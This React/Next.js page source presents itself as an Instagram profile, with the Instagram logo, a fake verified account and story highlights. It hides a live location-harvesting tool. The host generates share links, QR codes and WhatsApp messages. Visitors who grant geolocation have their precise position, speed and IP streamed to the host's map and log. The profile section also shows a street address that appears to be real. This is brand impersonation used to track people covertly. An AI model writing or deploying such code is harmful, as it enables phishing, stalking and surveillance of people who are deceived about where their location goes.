"use client";

import { useEffect, useState, useRef } from 'react';
import io from 'socket.io-client';
import QRCode from 'qrcode';
import dynamic from 'next/dynamic';
import RecipientFeed from './recipient';

const MapView = dynamic(() => import('../components/MapView'), { ssr: false });

const BACKEND_URL = process.env.NEXT_PUBLIC_SOCKET_URL || 'http://localhost:5000';

export default function Home() {
  const [isMounted, setIsMounted] = useState(false);
  const [socket, setSocket] = useState(null);
  const [isConnected, setIsConnected] = useState(false);
  const [sessionId, setSessionId] = useState('');
  const [isHost, setIsHost] = useState(true);
  const [sessionCreated, setSessionCreated] = useState(false);

  // Form states
  const [isFollowing, setIsFollowing] = useState(false);
  const [sessionTitle, setSessionTitle] = useState('My Mobile Location Request');
  const [sessionDuration, setSessionDuration] = useState('60');
  const [shareUrl, setShareUrl] = useState('');
  const [whatsappUrl, setWhatsappUrl] = useState('');

  // Live Location & Telemetry states
  const [activeLocations, setActiveLocations] = useState([]);
  const [telemetry, setTelemetry] = useState({
    latLng: '-- / --',
    ip: '--',
    accuracySpeed: '-- m | -- km/h',
    timestamp: 'Awaiting signal'
  });
  const [dbRecords, setDbRecords] = useState([]);

  // Recipient Consent states
  const [isSharingActive, setIsSharingActive] = useState(false);
  const [participantName, setParticipantName] = useState('');
  const [mobCoords, setMobCoords] = useState('Detecting...');
  const [mobPackets, setMobPackets] = useState(0);

  const qrCanvasRef = useRef(null);
  const watchIdRef = useRef(null);
  const simIntervalRef = useRef(null);

  useEffect(() => {
    setIsMounted(true);

    const params = new URLSearchParams(window.location.search);
    const sid = params.get('session');

    const s = io(BACKEND_URL);
    setSocket(s);

    s.on('connect', () => {
      setIsConnected(true);
      console.log('Connected to backend at:', BACKEND_URL);
    });

    s.on('disconnect', () => {
      setIsConnected(false);
    });

    if (sid) {
      setIsHost(false);
      setSessionId(sid);
      s.emit('join-session', { sessionId: sid }, (res) => {
        if (res && res.success) {
          setSessionTitle(res.sessionTitle);
        }
      });
    }

    s.on('location-updated', (data) => {
      const { participantId, participantName, ip, location } = data;
      const { latitude, longitude, accuracy, speed } = location;

      setTelemetry({
        latLng: `${latitude.toFixed(5)}, ${longitude.toFixed(5)}`,
        ip: ip || '127.0.0.1',
        accuracySpeed: `±${Math.round(accuracy || 5)}m | ${speed ? (speed * 3.6).toFixed(1) : 0} km/h`,
        timestamp: new Date().toLocaleTimeString()
      });

      const newLoc = {
        id: participantId,
        name: participantName,
        ip,
        latitude,
        longitude,
        accuracy,
        speed
      };

      setActiveLocations((prev) => {
        const filtered = prev.filter((item) => item.id !== participantId);
        return [...filtered, newLoc];
      });

      const newDbRecord = {
        timestamp: new Date().toLocaleTimeString(),
        name: participantName || 'Mobile Participant',
        ip: ip || '127.0.0.1',
        latitude: latitude.toFixed(6),
        longitude: longitude.toFixed(6),
        accuracy: accuracy ? `±${Math.round(accuracy)}m` : '±5m'
      };

      setDbRecords((prev) => [newDbRecord, ...prev.slice(0, 25)]);
    });

    return () => {
      s.disconnect();
    };
  }, []);

  const handleCreateSession = () => {
    if (!socket) return;

    socket.emit('create-session', {
      title: sessionTitle,
      durationMinutes: parseInt(sessionDuration, 10),
      origin: window.location.origin
    }, (res) => {
      if (res && res.success) {
        setSessionId(res.sessionId);
        setShareUrl(res.shareUrl);
        setSessionCreated(true);

        const waText = encodeURIComponent(`Please tap this link to share your location for session '${sessionTitle}': ${res.shareUrl}`);
        setWhatsappUrl(`https://api.whatsapp.com/send?text=${waText}`);

        setTimeout(() => {
          if (qrCanvasRef.current) {
            QRCode.toCanvas(qrCanvasRef.current, res.shareUrl, {
              width: 180,
              margin: 2,
              color: { dark: '#0F172A', light: '#FFFFFF' }
            });
          }
        }, 100);
      }
    });
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(shareUrl);
    alert('📋 Link copied to clipboard!');
  };

  const handleNativeShare = () => {
    if (navigator.share) {
      navigator.share({
        title: 'Share Live Location',
        text: `Tap this link to access and share live location for session '${sessionTitle}':`,
        url: shareUrl
      }).catch((err) => console.log('Share canceled:', err));
    } else {
      handleCopyLink();
    }
  };

  const handleStartHostDemoSim = () => {
    let lat = 28.6139;
    let lng = 77.2090;

    simIntervalRef.current = setInterval(() => {
      lat += (Math.random() - 0.25) * 0.0004;
      lng += (Math.random() - 0.15) * 0.0004;

      setTelemetry({
        latLng: `${lat.toFixed(5)}, ${lng.toFixed(5)}`,
        ip: '127.0.0.1 (Simulated)',
        accuracySpeed: '±4m | 7.5 km/h',
        timestamp: new Date().toLocaleTimeString()
      });

      setActiveLocations([
        {
          id: 'demo-sim',
          name: 'Demo Simulated Phone',
          ip: '127.0.0.1',
          latitude: lat,
          longitude: lng,
          accuracy: 4,
          speed: 2.1
        }
      ]);

      setDbRecords((prev) => [
        {
          timestamp: new Date().toLocaleTimeString(),
          name: 'Demo Simulated Phone',
          ip: '127.0.0.1',
          latitude: lat.toFixed(6),
          longitude: lng.toFixed(6),
          accuracy: '±4m'
        },
        ...prev.slice(0, 25)
      ]);
    }, 2000);
  };

  const handleGrantLocation = () => {
    if (!navigator.geolocation) {
      alert('Geolocation is not supported by your browser.');
      return;
    }

    setIsSharingActive(true);
    let count = 0;

    watchIdRef.current = navigator.geolocation.watchPosition(
      (pos) => {
        count++;
        setMobPackets(count);
        setMobCoords(`${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`);

        if (socket) {
          socket.emit('update-location', {
            sessionId,
            participantName: participantName || 'Mobile Participant',
            location: {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              speed: pos.coords.speed,
              heading: pos.coords.heading
            }
          });
        }
      },
      (err) => {
        console.error('Geolocation error:', err);
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  };

  const handleStopSharing = () => {
    if (watchIdRef.current) {
      navigator.geolocation.clearWatch(watchIdRef.current);
    }
    if (simIntervalRef.current) {
      clearInterval(simIntervalRef.current);
    }
    if (socket) {
      socket.emit('stop-sharing', { sessionId });
    }
    setIsSharingActive(false);
  };

  const handleRecipientSim = () => {
    setIsSharingActive(true);
    let lat = 28.6139;
    let lng = 77.2090;
    let count = 0;

    simIntervalRef.current = setInterval(() => {
      lat += (Math.random() - 0.3) * 0.0003;
      lng += (Math.random() - 0.2) * 0.0003;
      count++;

      setMobPackets(count);
      setMobCoords(`${lat.toFixed(4)}, ${lng.toFixed(4)}`);

      if (socket) {
        socket.emit('update-location', {
          sessionId,
          participantName: participantName || 'Simulated Phone',
          location: {
            latitude: lat,
            longitude: lng,
            accuracy: 4,
            speed: 1.8,
            heading: 45
          }
        });
      }
    }, 2000);
  };

  if (!isMounted) return null;

  return (
    <div className="ig-app">
      {/* Left Sidebar */}
      <aside className="ig-sidebar">
        <div className="ig-logo">
          <span className="logo-text">Instagram</span>
        </div>
        <nav className="ig-navigation">
          <a className="ig-nav-item active">
            <span className="ig-icon">
              <svg viewBox="0 0 24 24"><path d="M3 11.5 12 4l9 7.5" /><path d="M5 10.5V20h14v-9.5" /><path d="M9 20v-6h6v6" /></svg>
            </span>
            <span>Home</span>
          </a>
          <a className="ig-nav-item">
            <span className="ig-icon">
              <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7" /><path d="m20 20-4-4" /></svg>
            </span>
            <span>Reel</span>
          </a>
        </nav>
      </aside>

      {/* Main Container */}
      <main className="ig-main">
        <header className="ig-topbar">
          <div className="mobile-logo">Instagram</div>
          <div className={`connection-status ${isConnected ? 'status-connected' : 'status-connecting'}`}>
            <span className="status-dot"></span>
            <span className="status-text">{isConnected ? 'System Ready' : 'Connecting Backend...'}</span>
          </div>
        </header>

        <div className="feed-container">
          {/* Instagram Profile Header (Visible to both Host and Recipient) */}
          <section className="profile-header">
            <div className="profile-avatar">
              <div className="location-avatar">
                <div className="ig-story-ring">
                  <img src="/highlights/profile.jpg" alt="profile" />
                </div>
              </div>
            </div>
            <div className="profile-info">
              <div className="profile-title">
                <h1>mr_in.nocent_yogi</h1>
                <span className="verified">✓</span>
              </div>

              <div className="profile-stats">
                <div><strong>94</strong><span>posts</span></div>
                <div><strong>293</strong><span>followers</span></div>
                <div><strong>625</strong><span>following</span></div>
              </div>

              <div className="profile-description">
                <p>Avalai Avalai 🧚 Rasithu Kidanthu Vizhigal👀
                  Vaeraraiyum Paarkathae🙈
                  Avalai Avalai Pazhagi Tholaitha Ithayam
                  Vaeraraiyum Aerkaathae❣️
                  @editor_Yogi_R³</p>
                <span className="profile-link">🔗 yrdigitalenterprises.in</span>
                <span className="profile-link">13/b kuttiyan palayam street, Kumbakonam 612001</span>
              </div>
            </div>
          </section>

          {/* Profile Action Buttons */}
          <div className="profile-action-buttons">
            <button
              className={`profile-follow-btn ${isFollowing ? 'following' : ''}`}
              onClick={() => setIsFollowing(!isFollowing)}
            >
              {isFollowing ? 'Following' : 'Follow'}
            </button>
            <button className="profile-user-plus-btn" title="Discover People">
              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
                <circle cx="8.5" cy="7" r="4" />
                <line x1="20" y1="8" x2="20" y2="14" />
                <line x1="23" y1="11" x2="17" y2="11" />
              </svg>
            </button>
          </div>

          {/* Story Highlights Section */}
          <div className="highlights-row">
            <div className="highlight-item">
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/business.jpg" alt="Bussiness" />
                </div>
              </div>
              <span>Bussiness</span>
            </div>

            <div className="highlight-item">
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/invitations.jpg" alt="invitations" />
                </div>
              </div>
              <span>invitations</span>
            </div>

            <div className="highlight-item">
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/aval.jpg" alt="Aval" />
                </div>
              </div>
              <span>Aval ❣️</span>
            </div>

            <div className="highlight-item">
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/thumbnails.jpg" alt="Thumbnails" />
                </div>
              </div>
              <span>Thumbnails...</span>
            </div>

            <div className="highlight-item">
              <div className="highlight-ring">
                <div className="highlight-avatar">
                  <img src="/highlights/king.jpg" alt="king" />
                </div>
              </div>
              <span>king 👑</span>
            </div>

            <div className="highlight-item">
              <div className="highlight-ring">
                <div className="highlight-avatar" style={{ background: '#181A20', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                  <svg viewBox="0 0 24 24" width="24" height="24" stroke="#FFFFFF" fill="none" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <line x1="12" y1="5" x2="12" y2="19"></line>
                    <line x1="5" y1="12" x2="19" y2="12"></line>
                  </svg>
                </div>
              </div>
              <span>New</span>
            </div>
          </div>

          {/* Recipient & Host Feed Component */}
          <RecipientFeed
            isHost={isHost}
            sessionCreated={sessionCreated}
            sessionTitle={sessionTitle}
            setSessionTitle={setSessionTitle}
            sessionDuration={sessionDuration}
            setSessionDuration={setSessionDuration}
            handleCreateSession={handleCreateSession}
            shareUrl={shareUrl}
            qrCanvasRef={qrCanvasRef}
            handleCopyLink={handleCopyLink}
            whatsappUrl={whatsappUrl}
            handleNativeShare={handleNativeShare}
            handleStartHostDemoSim={handleStartHostDemoSim}
            activeLocations={activeLocations}
            telemetry={telemetry}
            dbRecords={dbRecords}
            backendUrl={BACKEND_URL}
            isSharingActive={isSharingActive}
            participantName={participantName}
            setParticipantName={setParticipantName}
            handleGrantLocation={handleGrantLocation}
            handleRecipientSim={handleRecipientSim}
            mobCoords={mobCoords}
            mobPackets={mobPackets}
            handleStopSharing={handleStopSharing}
          />
        </div>
      </main>
    </div>
  );
}
